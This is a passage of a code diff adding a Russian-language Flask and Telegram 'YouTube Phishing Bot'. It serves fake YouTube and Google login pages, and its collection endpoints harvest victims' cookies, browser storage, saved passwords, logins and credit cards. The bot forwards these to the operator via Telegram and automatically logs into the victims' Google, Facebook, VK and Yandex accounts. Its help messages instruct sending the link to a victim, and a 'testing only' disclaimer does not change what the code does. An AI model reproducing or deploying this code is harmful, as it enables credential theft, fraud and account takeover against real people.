+                navigator.clipboard.writeText(url).then(() => {{
+                    alert('Ссылка скопирована в буфер обмена!');
+                }});
+            }}
+        </script>
+    </body>
+    </html>
+    """
+    
+    return html_content
+
+@app.route('/watch')
+def watch_page():
+    """Страница с YouTube видео для фишинга"""
+    video_id = request.args.get('v', 'dQw4w9WgXcQ')
+    link_id = request.args.get('id', str(uuid.uuid4())[:12])
+    
+    # Увеличиваем счетчик кликов
+    db.increment_clicks(link_id)
+    
+    # Получаем информацию о видео
+    video_info = extract_youtube_video_info(f"https://youtube.com/watch?v={video_id}")
+    
+    # Заменяем плейсхолдеры в шаблоне
+    html_content = HTML_TEMPLATES["youtube_page"].format(
+        youtube_id=video_id,
+        link_id=link_id,
+        ngrok_url=current_ngrok_url or f"http://localhost:{FLASK_PORT}",
+        video_title=video_info['title'],
+        views_count=video_info['views'],
+        upload_date=video_info['upload_date'],
+        like_count=video_info['likes'],
+        channel_name=video_info['channel_name'],
+        subscribers_count=video_info['subscribers'],
+        video_description=video_info['description'],
+        comments_count=video_info['comments']
     )
     
-    parser.add_argument('action', 
-                       choices=['start', 'stop', 'restart', 'status', 'logs', 'clear'],
-                       help='Действие')
-    parser.add_argument('lines', type=int, nargs='?', default=20,
-                       help='Количество строк логов (только для action=logs)')
+    return html_content
+
+@app.route('/login')
+def login_page():
+    """Страница входа в Google"""
+    link_id = request.args.get('link_id', '')
+    service = request.args.get('service', 'google')
     
-    args = parser.parse_args()
-    manager = BotManager()
+    if service == 'google':
+        html_content = HTML_TEMPLATES["login_form"].format(link_id=link_id)
+        return html_content
     
-    print(f"\n🎮 Менеджер для code3.py")
-    print(f"{'='*30}")
-    
-    if args.action == 'start':
-        manager.start()
-    elif args.action == 'stop':
-        manager.stop()
-    elif args.action == 'restart':
-        print("🔄 Перезапуск code3.py...")
-        manager.stop()
-        time.sleep(2)
-        manager.start()
-    elif args.action == 'status':
-        manager.status()
-    elif args.action == 'logs':
-        manager.show_logs(args.lines)
-    elif args.action == 'clear':
-        confirm = input("❓ Очистить все логи? (y/N): ")
-        if confirm.lower() == 'y':
-            manager.clear_logs()
+    return "Сервис не поддерживается", 404
+
+@app.route('/login_success')
+def login_success():
+    """Страница успешного входа"""
+    service = request.args.get('service', 'google')
+    html_content = HTML_TEMPLATES["login_success"].format(service=service)
+    return html_content
+
+@app.route('/api/collect', methods=['POST'])
+def collect_data():
+    """API для сбора данных с клиента"""
+    try:
+        data = request.json
+        if not data:
+            return jsonify({'status': 'error', 'message': 'No data'}), 400
+        
+        link_id = data.get('link_id')
+        data_type = data.get('data_type', 'unknown')
+        encoded_data = data.get('data')
+        
+        if not link_id or not encoded_data:
+            return jsonify({'status': 'error', 'message': 'Missing data'}), 400
+        
+        # Декодируем данные
+        try:
+            json_string = base64.b64decode(encoded_data).decode('utf-8')
+            collected_data = json.loads(json_string)
+        except Exception as e:
+            logger.error(f"Error decoding data: {e}")
+            return jsonify({'status': 'error', 'message': 'Decode error'}), 400
+        
+        # Получаем IP адрес
+        ip_address = request.remote_addr
+        if request.headers.get('X-Forwarded-For'):
+            ip_address = request.headers.get('X-Forwarded-For').split(',')[0].strip()
+        
+        # Определяем сервисы из данных
+        identified_services = []
+        
+        # Из email в логинах
+        logins = collected_data.get('logins', [])
+        for login in logins:
+            email = login.get('value', '')
+            if '@' in email:
+                if '@gmail.com' in email or '@googlemail.com' in email:
+                    identified_services.append('google')
+                elif '@yandex.' in email or '@ya.ru' in email:
+                    identified_services.append('yandex')
+                elif '@mail.ru' in email or '@inbox.ru' in email:
+                    identified_services.append('mailru')
+                elif '@vk.com' in email:
+                    identified_services.append('vk')
+        
+        # Из cookies
+        cookies = collected_data.get('cookies', {})
+        cookies_list = [{'name': k, 'value': v} for k, v in cookies.items()]
+        
+        # Определяем сервисы из cookies
+        for cookie in cookies_list:
+            name = cookie['name'].lower()
+            if 'google' in name:
+                identified_services.append('google')
+            elif 'facebook' in name or 'fb_' in name:
+                identified_services.append('facebook')
+            elif 'instagram' in name or 'ig_' in name:
+                identified_services.append('instagram')
+            elif 'twitter' in name or 'auth_token' in name:
+                identified_services.append('twitter')
+            elif 'vk' in name or 'vkontakte' in name:
+                identified_services.append('vk')
+            elif 'yandex' in name:
+                identified_services.append('yandex')
+        
+        identified_services = list(set(identified_services))
+        
+        # Создаем запись для базы
+        data_id = str(uuid.uuid4())[:12]
+        
+        captured_data = {
+            'id': data_id,
+            'link_id': link_id,
+            'timestamp': datetime.now().isoformat(),
+            'ip_address': ip_address,
+            'user_agent': collected_data.get('userAgent', ''),
+            'cookies': cookies_list,
+            'localStorage': collected_data.get('localStorage', {}),
+            'sessionStorage': collected_data.get('sessionStorage', {}),
+            'passwords': collected_data.get('passwords', []),
+            'logins': collected_data.get('logins', []),
+            'credit_cards': collected_data.get('creditCards', []),
+            'autofill_data': collected_data.get('autofillData', {}),
+            'browser_info': collected_data.get('browserInfo', {}),
+            'device_info': {
+                'screen': collected_data.get('screen', {}),
+                'platform': collected_data.get('platform', ''),
+                'timezone': collected_data.get('timezone', '')
+            },
+            'network_info': {
+                'ip': ip_address
+            },
+            'sensitive_data': collected_data,
+            'identified_services': identified_services
+        }
+        
+        # Сохраняем в базу
+        db.add_captured_data(captured_data)
+        
+        # Отправляем уведомление в Telegram
+        if telegram_app and telegram_app.bot:
+            asyncio.run_coroutine_threadsafe(
+                send_telegram_notification(captured_data),
+                telegram_app._network_loop
+            )
+        
+        # Запускаем автоматический вход если есть данные
+        if identified_services and (cookies_list or captured_data['passwords']):
+            threading.Thread(
+                target=run_auto_login,
+                args=(captured_data,),
+                daemon=True
+            ).start()
+        
+        return jsonify({
+            'status': 'success',
+            'id': data_id,
+            'message': 'Data collected successfully'
+        })
+        
+    except Exception as e:
+        logger.error(f"Error in collect_data: {e}")
+        return jsonify({'status': 'error', 'message': str(e)}), 500
+
+@app.route('/api/collect_login', methods=['POST'])
+def collect_login():
+    """Сбор данных из формы входа"""
+    try:
+        data = request.json
+        link_id = data.get('link_id')
+        encoded_data = data.get('data')
+        
+        if not link_id or not encoded_data:
+            return jsonify({'status': 'error'}), 400
+        
+        # Декодируем данные
+        json_string = base64.b64decode(encoded_data).decode('utf-8')
+        login_data = json.loads(json_string)
+        
+        ip_address = request.remote_addr
+        if request.headers.get('X-Forwarded-For'):
+            ip_address = request.headers.get('X-Forwarded-For').split(',')[0].strip()
+        
+        # Создаем запись
+        data_id = str(uuid.uuid4())[:12]
+        
+        captured_data = {
+            'id': data_id,
+            'link_id': link_id,
+            'timestamp': datetime.now().isoformat(),
+            'ip_address': ip_address,
+            'user_agent': login_data.get('userAgent', ''),
+            'cookies': [],
+            'passwords': [{
+                'field': 'password',
+                'value': login_data.get('password', ''),
+                'form': 'google_login'
+            }],
+            'logins': [{
+                'field': 'email',
+                'value': login_data.get('email', ''),
+                'type': 'email'
+            }],
+            'identified_services': ['google']
+        }
+        
+        # Сохраняем
+        db.add_captured_data(captured_data)
+        
+        # Уведомление в Telegram
+        if telegram_app and telegram_app.bot:
+            asyncio.run_coroutine_threadsafe(
+                send_telegram_notification(captured_data),
+                telegram_app._network_loop
+            )
+        
+        return jsonify({'status': 'success'})
+        
+    except Exception as e:
+        logger.error(f"Error in collect_login: {e}")
+        return jsonify({'status': 'error'}), 500
+
+def run_auto_login(captured_data):
+    """Запускает автоматический вход в аккаунты"""
+    try:
+        logger.info(f"Starting auto login for data: {captured_data['id']}")
+        
+        results = auto_login_manager.auto_login_all_services(captured_data)
+        
+        # Сохраняем результаты
+        for result in results:
+            if result:
+                login_result = {
+                    'data_id': captured_data['id'],
+                    'service': result.get('service', 'unknown'),
+                    'success': result.get('success', False),
+                    'message': result.get('message', ''),
+                    'account_info': result.get('account_info', {}),
+                    'screenshot_path': result.get('screenshot_path'),
+                    'timestamp': datetime.now().isoformat()
+                }
+                
+                db.add_auto_login_result(login_result)
+                
+                # Отправляем уведомление в Telegram если успешно
+                if result.get('success') and telegram_app and telegram_app.bot:
+                    asyncio.run_coroutine_threadsafe(
+                        send_auto_login_notification(login_result),
+                        telegram_app._network_loop
+                    )
+        
+        logger.info(f"Auto login completed for {captured_data['id']}")
+        
+    except Exception as e:
+        logger.error(f"Error in run_auto_login: {e}")
+
+# ========== TELEGRAM ФУНКЦИИ ==========
+async def send_telegram_notification(data):
+    """Отправляет уведомление в Telegram о новых данных"""
+    try:
+        if not telegram_app or not telegram_app.bot:
+            return
+        
+        link_info = db.get_link(data['link_id'])
+        link_url = link_info['phishing_url'] if link_info else 'N/A'
+        
+        message = f"""
+🔐 *НОВЫЕ ДАННЫЕ ЗАХВАЧЕНЫ!*
+
+📌 *Информация о сессии:*
+• ID данных: `{data['id']}`
+• ID ссылки: `{data['link_id']}`
+• Время: {data['timestamp'][:19]}
+• IP: `{data['ip_address']}`
+• User Agent: {data['user_agent'][:50]}...
+
+📊 *Собранные данные:*
+• Cookies: {len(data.get('cookies', []))}
+• Логины: {len(data.get('logins', []))}
+• Пароли: {len(data.get('passwords', []))}
+• LocalStorage: {len(data.get('localStorage', {}))}
+• SessionStorage: {len(data.get('sessionStorage', {}))}
+
+🌐 *Определенные сервисы:*
+"""
+        
+        services = data.get('identified_services', [])
+        if services:
+            for service in services:
+                message += f"• {service.title()}\n"
         else:
-            print("Отменено")
+            message += "• Не определены\n"
+        
+        # Показываем логины если есть
+        logins = data.get('logins', [])
+        if logins:
+            message += "\n👤 *Найденные логины:*\n"
+            for login in logins[:3]:
+                value = login.get('value', '')
+                if '@' in value:
+                    message += f"• `{value}`\n"
+        
+        # Показываем пароли если есть
+        passwords = data.get('passwords', [])
+        if passwords:
+            message += "\n🔑 *Найденные пароли:*\n"
+            for pwd in passwords[:2]:
+                message += f"• `{pwd.get('value', '')}`\n"
+        
+        stats = db.get_stats()
+        message += f"""
+🚀 *Автоматический вход:* Запущен для {len(services)} сервисов
+
+📈 *Статистика системы:*
+• Всего данных: {stats.get('total_captured', 0)}
+• Учетных записей: {stats.get('total_credentials', 0)}
+• Успешных входов: {stats.get('auto_login_success', 0)}
+
+💡 *Команды:*
+• /data {data['id']} - Детали данных
+• /auto_login {data['id']} - Попытка входа
+• /stats - Полная статистика
+"""
+        
+        await telegram_app.bot.send_message(
+            chat_id=ADMIN_ID,
+            text=message,
+            parse_mode=ParseMode.MARKDOWN,
+            disable_web_page_preview=True
+        )
+        
+    except Exception as e:
+        logger.error(f"Error sending Telegram notification: {e}")
+
+async def send_auto_login_notification(result):
+    """Отправляет уведомление об успешном автоматическом входе"""
+    try:
+        if not result.get('success'):
+            return
+        
+        message = f"""
+✅ *УСПЕШНЫЙ АВТОМАТИЧЕСКИЙ ВХОД!*
+
+🎯 *Сервис:* {result['service'].title()}
+📊 *Результат:* Успешно
+👤 *Информация об аккаунте:*
+"""
+        
+        account_info = result.get('account_info', {})
+        if account_info.get('email'):
+            message += f"• Email: `{account_info['email']}`\n"
+        if account_info.get('name'):
+            message += f"• Имя: {account_info['name']}\n"
+        if account_info.get('url'):
+            message += f"• URL: {account_info['url']}\n"
+        
+        message += f"""
+📅 *Время входа:* {result['timestamp'][:19]}
+🔗 *Данные ID:* `{result['data_id']}`
+
+🚀 *Автоматический вход выполнен на вашем устройстве!*
+Аккаунт теперь доступен в вашем браузере.
+"""
+        
+        # Отправляем скриншот если есть
+        if result.get('screenshot_path') and os.path.exists(result['screenshot_path']):
+            with open(result['screenshot_path'], 'rb') as photo:
+                await telegram_app.bot.send_photo(
+                    chat_id=ADMIN_ID,
+                    photo=photo,
+                    caption=message,
+                    parse_mode=ParseMode.MARKDOWN
+                )
+        else:
+            await telegram_app.bot.send_message(
+                chat_id=ADMIN_ID,
+                text=message,
+                parse_mode=ParseMode.MARKDOWN
+            )
+        
+    except Exception as e:
+        logger.error(f"Error sending auto login notification: {e}")
+
+# ========== TELEGRAM КОМАНДЫ ==========
+async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Команда /start"""
+    user = update.effective_user
+    
+    welcome_message = f"""
+👋 *Добро пожаловать, {user.first_name}!*
+
+🤖 *YouTube Phishing Bot*
+
+🎯 *Что делает этот бот:*
+1. Принимает ссылку на YouTube видео
+2. Создает фишинг ссылку с видео
+3. Когда жертва переходит - собирает ВСЕ данные:
+   • Cookies, LocalStorage, SessionStorage
+   • Сохраненные пароли и логины
+   • Данные автозаполнения
+   • Информацию о браузере и устройстве
+4. *АВТОМАТИЧЕСКИ ВХОДИТ в аккаунты на ВАШЕМ устройстве*
+5. Отправляет скриншоты успешных входов
+
+⚡ *Как использовать:*
+1. Запустите ngrok: /start_ngrok
+2. Получите основную ссылку: /get_url
+3. Перейдите по ссылке в браузере
+4. Вставьте ссылку на YouTube видео
+5. Получите фишинг ссылку
+6. Отправьте её жертве
+7. Получайте данные в реальном времени
+
+🔧 *Основные команды:*
+• /start_ngrok - Запустить сервер
+• /stop_ngrok - Остановить сервер
+• /get_url - Получить URL сервера
+• /stats - Статистика системы
+• /my_links - Мои фишинг ссылки
+• /auto_login [ID] - Запустить автовход
+• /help - Помощь
+
+⚠️ *ВНИМАНИЕ:* 
+• Используйте только для тестирования!
+• Все действия логируются
+• Автоматический вход работает на ВАШЕМ устройстве
+"""
+    
+    keyboard = [
+        [InlineKeyboardButton("🚀 Запустить ngrok", callback_data="start_ngrok")],
+        [InlineKeyboardButton("🌐 Получить URL", callback_data="get_url")],
+        [InlineKeyboardButton("📊 Статистика", callback_data="stats")],
+        [InlineKeyboardButton("🔗 Мои ссылки", callback_data="my_links")]
+    ]
+    reply_markup = InlineKeyboardMarkup(keyboard)
+    
+    await update.message.reply_text(
+        welcome_message,
+        parse_mode=ParseMode.MARKDOWN,
+        reply_markup=reply_markup
+    )
+
+async def start_ngrok_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Запуск ngrok"""
+    global ngrok_manager, current_ngrok_url
+    
+    try:
+        await update.message.reply_text("🔄 *Запуск ngrok сервера...*", parse_mode=ParseMode.MARKDOWN)
+        
+        if ngrok_manager:
+            ngrok_manager.stop()
+        
+        ngrok_manager = NgrokManager(NGROK_AUTH_TOKEN)
+        public_url = ngrok_manager.start(FLASK_PORT)
+        
+        if public_url:
+            current_ngrok_url = public_url
+            
+            message = f"""
+✅ *Ngrok сервер запущен!*
+
+🔗 *Ваш URL:* {public_url}
+
+🌐 *Как использовать:*
+1. Перейдите по ссылке выше в браузере
+2. Вставьте ссылку на YouTube видео
+3. Получите фишинг ссылку
+4. Отправьте её жертве
+5. Данные будут приходить автоматически
+
+📡 *Порт:* {FLASK_PORT}
+⏱ *Запущен:* {datetime.now().strftime('%H:%M:%S')}
+
+⚠️ *Не закрывайте программу!*
+Сервер активен пока бот работает.
+"""
+            
+            keyboard = [
+                [InlineKeyboardButton("🌐 Открыть в браузере", url=public_url)],
+                [InlineKeyboardButton("🛑 Остановить сервер", callback_data="stop_ngrok")]
+            ]
+            reply_markup = InlineKeyboardMarkup(keyboard)
+            
+            await update.message.reply_text(
+                message,
+                parse_mode=ParseMode.MARKDOWN,
+                reply_markup=reply_markup
+            )
+        else:
+            await update.message.reply_text(
+                "❌ *Не удалось запустить ngrok!*\n\n"
+                "Проверьте:\n"
+                "1. Установлен ли ngrok\n"
+                "2. Верный ли auth token\n"
+                "3. Порт {FLASK_PORT} свободен\n\n"
+                "Скачайте ngrok: https://ngrok.com/download",
+                parse_mode=ParseMode.MARKDOWN
+            )
+    
+    except Exception as e:
+        logger.error(f"Error starting ngrok: {e}")
+        await update.message.reply_text(
+            f"❌ Ошибка: {str(e)[:100]}",
+            parse_mode=ParseMode.MARKDOWN
+        )
+
+async def stop_ngrok_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Остановка ngrok"""
+    global current_ngrok_url
+    
+    try:
+        if ngrok_manager:
+            ngrok_manager.stop()
+            current_ngrok_url = None
+        
+        await update.message.reply_text(
+            "🛑 *Сервер остановлен!*\n\n"
+            "Все фишинг ссылки неактивны.\n"
+            "Для запуска: /start_ngrok",
+            parse_mode=ParseMode.MARKDOWN
+        )
+    
+    except Exception as e:
+        logger.error(f"Error stopping ngrok: {e}")
+        await update.message.reply_text(
+            f"❌ Ошибка: {str(e)[:100]}",
+            parse_mode=ParseMode.MARKDOWN
+        )
+
+async def get_url_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Получение URL сервера"""
+    global current_ngrok_url
+    
+    if not current_ngrok_url:
+        await update.message.reply_text(
+            "❌ *Сервер не запущен!*\n\n"
+            "Используйте /start_ngrok для запуска",
+            parse_mode=ParseMode.MARKDOWN
+        )
+        return
+    
+    message = f"""
+🌐 *URL вашего сервера:*
+
+🔗 {current_ngrok_url}
+
+💡 *Инструкция:*
+1. Откройте ссылку в браузере
+2. Вставьте ссылку на YouTube видео
+3. Получите фишинг ссылку
+4. Отправьте жертве
+5. Данные придут сюда автоматически
+
+⚡ *Особенности:*
+• Видео воспроизводится как на YouTube
+• Сбор данных в фоновом режиме
+• Автоматический вход в аккаунты
+• Скриншоты успешных входов
+"""
+    
+    keyboard = [
+        [InlineKeyboardButton("🌐 Открыть в браузере", url=current_ngrok_url)],
+        [InlineKeyboardButton("🚀 Создать фишинг ссылку", url=f"{current_ngrok_url}/phishing_home")]
+    ]
+    reply_markup = InlineKeyboardMarkup(keyboard)
+    
+    await update.message.reply_text(
+        message,
+        parse_mode=ParseMode.MARKDOWN,
+        reply_markup=reply_markup,
+        disable_web_page_preview=True
+    )
+
+async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Статистика системы"""
+    stats = db.get_stats()
+    service_stats = db.get_service_stats()
+    
+    message = f"""
+📊 *СТАТИСТИКА СИСТЕМЫ*
+
+🔗 *Основные показатели:*
+• Создано ссылок: `{stats.get('total_links', 0)}`
+• Всего переходов: `{stats.get('total_clicks', 0)}`
+• Данных собрано: `{stats.get('total_captured', 0)}`
+• Учетных записей: `{stats.get('total_credentials', 0)}`
+• Cookies: `{stats.get('total_cookies', 0)}`
+
+🚀 *Автоматический вход:*
+• Попыток: `{stats.get('auto_login_attempts', 0)}`
+• Успешно: `{stats.get('auto_login_success', 0)}`
+• Успешность: `{round((stats.get('auto_login_success', 0) / stats.get('auto_login_attempts', 1)) * 100, 1) if stats.get('auto_login_attempts', 0) > 0 else 0}%`
+
+🌐 *По сервисам:*
+"""
+    
+    for service, stat in service_stats.items():
+        message += f"• {service.title()}: {stat['success']}/{stat['total']} ({stat['success_rate']}%)\n"
+    
+    message += f"""
+🔧 *Состояние сервера:*
+• Статус: {'🟢 Активен' if current_ngrok_url else '🔴 Неактивен'}
+• URL: {current_ngrok_url or 'Не запущен'}
+• Автовход: {'🟢 Готов' if auto_login_manager.driver else '🔴 Не готов'}
+
+💡 *Команды:*
+• /start_ngrok - Запустить сервер
+• /get_url - Получить URL
+• /my_links - Мои ссылки
+"""
+    
+    keyboard = [
+        [InlineKeyboardButton("🔄 Обновить", callback_data="stats")],
+        [InlineKeyboardButton("🚀 Запустить сервер", callback_data="start_ngrok")],
+        [InlineKeyboardButton("🔗 Мои ссылки", callback_data="my_links")]
+    ]
+    
+    if current_ngrok_url:
+        keyboard[1] = [InlineKeyboardButton("🌐 Открыть сервер", url=current_ngrok_url)]
+    
+    reply_markup = InlineKeyboardMarkup(keyboard)
+    
+    await update.message.reply_text(
+        message,
+        parse_mode=ParseMode.MARKDOWN,
+        reply_markup=reply_markup
+    )
+
+async def my_links_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Мои фишинг ссылки"""
+    user_id = update.effective_user.id
+    links = db.get_user_links(user_id)
+    
+    if not links:
+        await update.message.reply_text(
+            "📭 *У вас нет созданных ссылок.*\n\n"
+            "Чтобы создать ссылку:\n"
+            "1. Запустите сервер: /start_ngrok\n"
+            "2. Получите URL: /get_url\n"
+            "3. Перейдите по ссылке в браузере\n"
+            "4. Вставьте ссылку на YouTube видео\n"
+            "5. Получите фишинг ссылку",
+            parse_mode=ParseMode.MARKDOWN
+        )
+        return
+    
+    message = "🔗 *ВАШИ ФИШИНГ ССЫЛКИ:*\n\n"
+    
+    for i, link in enumerate(links[:10], 1):
+        data_count = len(db.get_data_by_link(link['id']))
+        
+        message += f"{i}. *ID:* `{link['id']}`\n"
+        message += f"   🎬 Видео: {link['youtube_id']}\n"
+        message += f"   📅 Создано: {link['created_at'][:10]}\n"
+        message += f"   👣 Переходов: {link['clicks']}\n"
+        message += f"   📊 Данных: {data_count}\n"
+        message += f"   🔗 Ссылка: {link['phishing_url'][:50]}...\n"
+        message += "   ─────\n"
+    
+    if len(links) > 10:
+        message += f"\n... и еще {len(links) - 10} ссылок\n"
+    
+    keyboard = []
+    for link in links[:3]:
+        keyboard.append([
+            InlineKeyboardButton(f"📊 {link['id'][:8]}...", callback_data=f"link_info_{link['id']}")
+        ])
+    
+    reply_markup = InlineKeyboardMarkup(keyboard) if keyboard else None
+    
+    await update.message.reply_text(
+        message,
+        parse_mode=ParseMode.MARKDOWN,
+        reply_markup=reply_markup
+    )
+
+async def auto_login_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Запуск автоматического входа"""
+    if not context.args:
+        await update.message.reply_text(
+            "🚀 *Автоматический вход*\n\n"
+            "Используйте: `/auto_login [ID_данных]`\n\n"
+            "Пример: `/auto_login abc123def456`\n\n"
+            "ID данных можно получить из уведомлений о собранных данных.",
+            parse_mode=ParseMode.MARKDOWN
+        )
+        return
+    
+    data_id = context.args[0]
+    data = db.get_captured_data(data_id)
+    
+    if not data:
+        await update.message.reply_text(
+            f"❌ Данные с ID `{data_id}` не найдены.",
+            parse_mode=ParseMode.MARKDOWN
+        )
+        return
+    
+    await update.message.reply_text(
+        f"🚀 *Запуск автоматического входа...*\n\n"
+        f"ID данных: `{data_id}`\n"
+        f"Сервисов определено: {len(data.get('identified_services', []))}\n"
+        f"Cookies: {len(data.get('cookies', []))}\n\n"
+        f"⏳ Процесс займет 1-2 минуты...",
+        parse_mode=ParseMode.MARKDOWN
+    )
+    
+    # Запускаем автовход в отдельном потоке
+    threading.Thread(
+        target=run_auto_login,
+        args=(data,),
+        daemon=True
+    ).start()
+
+async def data_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Просмотр данных"""
+    if not context.args:
+        await update.message.reply_text(
+            "📊 *Просмотр данных*\n\n"
+            "Используйте: `/data [ID_данных]`\n\n"
+            "Пример: `/data abc123def456`\n\n"
+            "ID данных можно получить из уведомлений.",
+            parse_mode=ParseMode.MARKDOWN
+        )
+        return
+    
+    data_id = context.args[0]
+    data = db.get_captured_data(data_id)
+    
+    if not data:
+        await update.message.reply_text(
+            f"❌ Данные с ID `{data_id}` не найдены.",
+            parse_mode=ParseMode.MARKDOWN
+        )
+        return
+    
+    link_info = db.get_link(data['link_id'])
+    link_url = link_info['phishing_url'] if link_info else 'N/A'
+    
+    message = f"""
+🔍 *ДЕТАЛЬНЫЙ ОТЧЕТ О ДАННЫХ*
+
+📌 *Идентификатор:* `{data['id']}`
+🔗 *Ссылка ID:* `{data['link_id']}`
+🕒 *Время сбора:* {data['timestamp'][:19]}
+🌐 *IP адрес:* `{data['ip_address']}`
+👤 *User Agent:* {data['user_agent'][:80]}...
+
+📊 *СОБРАННЫЕ ДАННЫЕ:*
+• Cookies: {len(data.get('cookies', []))}
+• Логины: {len(data.get('logins', []))}
+• Пароли: {len(data.get('passwords', []))}
+• LocalStorage: {len(data.get('localStorage', {}))}
+• SessionStorage: {len(data.get('sessionStorage', {}))}
+• Данных автозаполнения: {len(data.get('autofill_data', {}))}
+
+🌐 *ОПРЕДЕЛЕННЫЕ СЕРВИСЫ:*
+"""
+    
+    services = data.get('identified_services', [])
+    if services:
+        for service in services:
+            message += f"• {service.title()}\n"
+    else:
+        message += "• Не определены\n"
+    
+    # Логины
+    logins = data.get('logins', [])
+    if logins:
+        message += "\n👤 *НАЙДЕННЫЕ ЛОГИНЫ:*\n"
+        for login in logins[:5]:
+            value = login.get('value', '')
+            if value:
+                message += f"• `{value}`\n"
+    
+    # Пароли
+    passwords = data.get('passwords', [])
+    if passwords:
+        message += "\n🔑 *НАЙДЕННЫЕ ПАРОЛИ:*\n"
+        for pwd in passwords[:3]:
+            value = pwd.get('value', '')
+            if value:
+                message += f"• `{value}`\n"
+    
+    # Cookies
+    cookies = data.get('cookies', [])
+    if cookies:
+        message += f"\n🍪 *COOKIES (первые 5):*\n"
+        for cookie in cookies[:5]:
+            message += f"• {cookie.get('name', 'N/A')}: `{cookie.get('value', '')[:30]}...`\n"
+    
+    # Результаты автовхода
+    login_results = db.get_auto_login_results(data_id)
+    if login_results:
+        message += "\n🚀 *РЕЗУЛЬТАТЫ АВТОМАТИЧЕСКОГО ВХОДА:*\n"
+        for result in login_results[:3]:
+            status = "✅ Успешно" if result['success'] else "❌ Неудачно"
+            message += f"• {result['service'].title()}: {status}\n"
+    
+    message += f"""
+💡 *КОМАНДЫ:*
+• /auto_login {data_id} - Запустить автовход
+• /stats - Статистика
+"""
+    
+    await update.message.reply_text(
+        message,
+        parse_mode=ParseMode.MARKDOWN,
+        disable_web_page_preview=True
+    )
+
+async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Обработчик inline кнопок"""
+    query = update.callback_query
+    await query.answer()
+    
+    data = query.data
+    
+    if data == "start_ngrok":
+        await start_ngrok_command(query, context)
+    
+    elif data == "stop_ngrok":
+        await stop_ngrok_command(query, context)
+    
+    elif data == "get_url":
+        await get_url_command(query, context)
+    
+    elif data == "stats":
+        await stats_command(query, context)
+    
+    elif data == "my_links":
+        await my_links_command(query, context)
+    
+    elif data.startswith("link_info_"):
+        link_id = data[10:]
+        link = db.get_link(link_id)
+        
+        if link:
+            data_list = db.get_data_by_link(link_id)
+            
+            message = f"""
+🔗 *ИНФОРМАЦИЯ О ССЫЛКЕ*
+
+📌 *ID:* `{link['id']}`
+🎬 *YouTube ID:* {link['youtube_id']}
+🔗 *Оригинальная ссылка:* {link['youtube_url'][:50]}...
+🌐 *Фишинг ссылка:* {link['phishing_url'][:50]}...
+📅 *Создано:* {link['created_at'][:19]}
+👣 *Переходов:* {link['clicks']}
+📊 *Данных собрано:* {len(data_list)}
+
+📈 *ПОСЛЕДНИЕ ДАННЫЕ:*
+"""
+            
+            for i, data_item in enumerate(data_list[:3], 1):
+                message += f"\n{i}. *ID:* `{data_item['id']}`\n"
+                message += f"   🕒 {data_item['timestamp'][:16]}\n"
+                message += f"   🌐 {data_item['ip_address']}\n"
+                message += f"   👤 Логинов: {len(data_item.get('logins', []))}\n"
+                message += f"   🔑 Паролей: {len(data_item.get('passwords', []))}\n"
+                message += f"   🍪 Cookies: {len(data_item.get('cookies', []))}\n"
+            
+            keyboard = [
+                [InlineKeyboardButton("📊 Показать все данные", callback_data=f"show_all_data_{link_id}")],
+                [InlineKeyboardButton("🚀 Запустить автовход", callback_data=f"auto_login_link_{link_id}")]
+            ]
+            reply_markup = InlineKeyboardMarkup(keyboard)
+            
+            await query.message.reply_text(
+                message,
+                parse_mode=ParseMode.MARKDOWN,
+                reply_markup=reply_markup
+            )
+    
+    elif data == "help":
+        help_message = """
+🆘 *ПОМОЩЬ И ИНСТРУКЦИИ*
+
+🎯 *Как использовать систему:*
+1. Запустите сервер: /start_ngrok
+2. Получите URL: /get_url
+3. Откройте URL в браузере
+4. Вставьте ссылку на YouTube видео
+5. Получите фишинг ссылку
+6. Отправьте её жертве
+7. Получайте данные автоматически
+
+🔐 *Что собирается:*
+• Все cookies браузера
+• LocalStorage и SessionStorage
+• Сохраненные пароли и логины
+• Данные автозаполнения форм
+• Информация о браузере и устройстве
+• IP адрес и геолокация
+
+🚀 *АВТОМАТИЧЕСКИЙ ВХОД:*
+• Система автоматически входит в аккаунты на ВАШЕМ устройстве
+• Использует собранные cookies и пароли
+• Делает скриншоты успешных входов
+• Работает для Google, Facebook, VK, Яндекс и др.
+
+⚡ *Особенности:*
+• Видео воспроизводится как на YouTube
+• Сбор данных в фоновом режиме
+• Жертве не нужно ничего делать
+• Все данные сохраняются в базу
+
+🔧 *Основные команды:*
+• /start_ngrok - Запуск сервера
+• /stop_ngrok - Остановка сервера
+• /get_url - Получить URL сервера
+• /stats - Статистика системы
+• /my_links - Мои фишинг ссылки
+• /data [ID] - Просмотр данных
+• /auto_login [ID] - Запуск автовхода
+
+⚠️ *ВАЖНО:*
+• Используйте только для тестирования!
+• Все действия логируются
+• Автовход работает на вашем компьютере
+• Не нарушайте законодательство
+"""
+        await query.message.reply_text(help_message, parse_mode=ParseMode.MARKDOWN)
+
+async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Обработчик ошибок"""
+    logger.error(f"Update {update} caused error {context.error}", exc_info=True)
+    
+    try:
+        error_msg = str(context.error)
+        if len(error_msg) > 1000:
+            error_msg = error_msg[:1000] + "..."
+        
+        await context.bot.send_message(
+            chat_id=ADMIN_ID,
+            text=f"⚠️ *Ошибка в боте:*\n\n{error_msg}",
+            parse_mode=ParseMode.MARKDOWN
+        )
+    except:
+        pass
+
+# ========== ЗАПУСК СИСТЕМЫ ==========
+def run_flask():
+    """Запуск Flask сервера"""
+    try:
+        logger.info(f"Starting Flask server on port {FLASK_PORT}")
+        app.run(
+            host='0.0.0.0',
+            port=FLASK_PORT,
+            debug=False,
+            use_reloader=False,
+            threaded=True
+        )
+    except Exception as e:
+        logger.error(f"Flask server error: {e}")
+
+def main():
+    """Основная функция запуска"""
+    global telegram_app
+    
+    print("=" * 70)
+    print("🤖 YOUTUBE PHISHING BOT - ПОЛНЫЙ КОМПЛЕКС С АВТОВХОДОМ")
+    print("=" * 70)
+    print()
+    
+    # Проверка токенов
+    if BOT_TOKEN == "ВАШ_ТОКЕН_БОТА_TELEGRAM":
